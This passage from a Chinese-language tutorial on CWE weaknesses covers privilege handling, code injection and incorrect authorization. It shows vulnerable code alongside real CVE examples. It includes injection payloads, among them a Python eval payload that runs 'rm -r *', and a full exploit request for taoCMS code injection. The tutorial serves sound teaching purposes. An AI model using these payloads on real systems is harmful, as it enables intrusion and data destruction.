</code></pre></div><p class="x-p">上述代码先提高权限以创建文件夹，然后立刻降回来。但如果<code class="x-inline-highlight">os.mkdir()</code>发生了异常，就不会调用<code class="x-inline-highlight">lowerPrivileges()</code>，这时程序会在提高的权限下运行，可能导致进一步被利用。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Roles</span>
<span class="token punctuation">{</span>
    <span class="token constant">ADMIN</span><span class="token punctuation">,</span><span class="token constant">OPERATOR</span><span class="token punctuation">,</span><span class="token constant">USER</span><span class="token punctuation">,</span><span class="token constant">GUEST</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">resetPassword</span><span class="token punctuation">(</span><span class="token class-name">User</span> requestingUser<span class="token punctuation">,</span> <span class="token class-name">User</span> user<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isAuthenticated</span><span class="token punctuation">(</span>requestingUser<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>requestingUser<span class="token punctuation">.</span>role<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token constant">GUEST</span><span class="token operator">:</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You are not authorized to perform this command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        <span class="token keyword">case</span> <span class="token constant">USER</span><span class="token operator">:</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You are not authorized to perform this command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token function">setPassword</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You must be logged in to perform this command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">这个系统定义了不同等级的用户，<code class="x-inline-highlight">ADMIN</code>和<code class="x-inline-highlight">OPERATOR</code>都可以重置密码。系统设计的初衷是想让<code class="x-inline-highlight">OPERATOR</code>拥有稍弱于<code class="x-inline-highlight">ADMIN</code>的权限；然而既然<code class="x-inline-highlight">OPERATOR</code>可以修改密码，那么就可以通过重置<code class="x-inline-highlight">ADMIN</code>账号的密码来控制一个管理员账号。此例的权限管理是有缺陷的。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2017-11747" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2017-11747</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/tinyproxy/tinyproxy/issues/106" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/tinyproxy/tinyproxy/issues/106</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e</a></p></div></div><p class="x-p">Tinyproxy 1.8.4及更早版本中的<code class="x-inline-highlight">main.c</code>会在向非<code class="x-inline-highlight">root</code>帐户下放权限后创建<code class="x-inline-highlight">/run/tinyproxy/tinyproxy.pid</code>文件，这可能允许本地用户在<code class="x-inline-highlight">root</code>脚本执行<code class="x-inline-highlight">kill &#96;cat /run/tinyproxy/tinyproxy.pid&#96;</code>命令之前，利用访问该非<code class="x-inline-highlight">root</code>帐户的权限来修改<code class="x-inline-highlight">tinyproxy.pid</code>，从而杀死任意进程。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-green) 24px 240px, transparent 240px, transparent 504px, var(--bg-transparent-red) 504px 720px, transparent 720px)"><code><span class="token comment">/* Create pid file before we drop privileges */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pidfile_create</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">fprintf</span> <span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s: Could not create PID file.\n"</span><span class="token punctuation">,</span>
                         argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span> <span class="token punctuation">(</span>EX_OSERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/* Switch to a different user if we're running as root */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">geteuid</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">change_user</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
        <span class="token function">log_message</span> <span class="token punctuation">(</span>LOG_WARNING<span class="token punctuation">,</span>
                     <span class="token string">"Not running as root, so not changing UID/GID."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* Create log file after we drop privileges */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setup_logging</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span> <span class="token punctuation">(</span>EX_SOFTWARE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* Create pid file after we drop privileges */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pidfile_create</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>pidpath<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">fprintf</span> <span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s: Could not create PID file.\n"</span><span class="token punctuation">,</span>
                         argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span> <span class="token punctuation">(</span>EX_OSERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noreferrer">【B】CWE-94: Improper Control of Generation of Code (&#x27;Code Injection&#x27;)</a></h3><p class="x-p">当产品允许用户输入包含代码语法的内容时，攻击者有可能以改变产品预期控制流的方式编写代码。这种改变可能导致任意代码的执行。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$MessageFile</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"messages.out"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"NewMessage"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$MessageFile</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;b><span class="token interpolation"><span class="token variable">$name</span></span>&lt;/b> says '<span class="token interpolation"><span class="token variable">$message</span></span>'&lt;hr>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Message Saved!&lt;p>\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"ViewMessages"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$MessageFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">这段代码尝试将用户消息写入消息文件并允许用户查看它们。开发者可能希望文件只包含数据，然而攻击者可以构造以下参数：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E
</code></pre></div><p class="x-p">这会被解析成：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/ls -l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></div><p class="x-p">这将导致用户查看它们的时候，PHP代码被解析执行。注意这种情况下，同样存在XSS漏洞风险。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>
    numbers <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter a space-separated list of numbers: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> num <span class="token keyword">in</span> numbers<span class="token punctuation">:</span>
        <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token builtin">sum</span> <span class="token operator">+</span> num
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Sum of </span><span class="token interpolation"><span class="token punctuation">{</span>numbers<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">sum</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">eval</code>函数会执行用户输入的代码，一个可以注入的载荷是<code class="x-inline-highlight">__import__('subprocess').getoutput('rm -r *')</code>。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2023-1947" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2023-1947</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://gitee.com/misak7in/cve/blob/master/taocms.md" target="_blank" rel="noreferrer" class="x-inline-link">https://gitee.com/misak7in/cve/blob/master/taocms.md</a></p></div></div><p class="x-p">taoCMS 3.0.2存在代码注入漏洞，发送请求：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>POST /admin/admin.php HTTP/1.1
Host: www.taocms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 161
Origin: http://www.taocms.com
Connection: close
Referer: http://www.taocms.com/admin/admin.php?action=category&amp;ctrl=add
Cookie: PHPSESSID=3p2h8g38ejqf1402s5i384b7h0
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

name=%27%29%29%3Bphpinfo%28%29%3B%2F*&amp;nickname=22&amp;fid=&amp;cattpl=&amp;listtpl=&amp;distpl=&amp;intro=33&amp;orders=&amp;status=1&amp;action=category&amp;id=&amp;ctrl=save&amp;Submit=%E6%8F%90%E4%BA%A4
</code></pre></div><p class="x-p">请求的参数解析后是：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>name='));phpinfo();/*&amp;nickname=...</code></pre></div><p class="x-p">内容会被写入<code class="x-inline-highlight">cat_array.inc</code>文件：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$cats</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token number">0</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token string single-quoted-string">'name'</span><span class="token operator">=></span><span class="token string single-quoted-string">'未分组'</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'status'</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'orders'</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'id'</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">7</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token string single-quoted-string">'name'</span><span class="token operator">=></span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*

...*/</span>
</span></code></pre></div><p class="x-p">后面的内容被注释。文件在<code class="x-inline-highlight">/wap/index.php</code>被引入，从而可以获取系统配置。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/863.html" target="_blank" rel="noreferrer">【C】CWE-863: Incorrect Authorization</a></h3><p class="x-p">错误的授权，没有正确验证用户是否有权访问资源。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px)"><code><span class="token variable">$role</span> <span class="token operator">=</span> <span class="token variable">$_COOKIES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$role</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token function">getRole</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// save the cookie to send out in future responses</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"role"</span><span class="token punctuation">,</span> <span class="token variable">$role</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token function">ShowLoginScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'Reader'</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">DisplayMedicalHistory</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'patient_ID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You are not Authorized to view this record\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">修改cookie即可绕过授权。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2024-22208" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2024-22208</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e</a></p></div></div><p class="x-p">phpMyFAQ v3.2.5前的<code class="x-inline-highlight">Sharing FAQ</code>功能可以给其他邮箱分享讯息，前端只有<code class="x-inline-highlight">5</code>个输入框（希望用户最多分享给<code class="x-inline-highlight">5</code>个邮箱），然而后端并没有对数量做限制，攻击者可以构造请求发送大量邮件。</p><p class="x-p">部分补丁的内容：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 144px, var(--bg-transparent-red) 144px 168px, transparent 168px, transparent 240px, var(--bg-transparent-green) 240px 456px, transparent 456px)"><code><span class="token keyword">case</span> <span class="token string single-quoted-string">'sendtofriends'</span><span class="token punctuation">:</span>
    <span class="token variable">$postData</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">JSON_THROW_ON_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$author</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
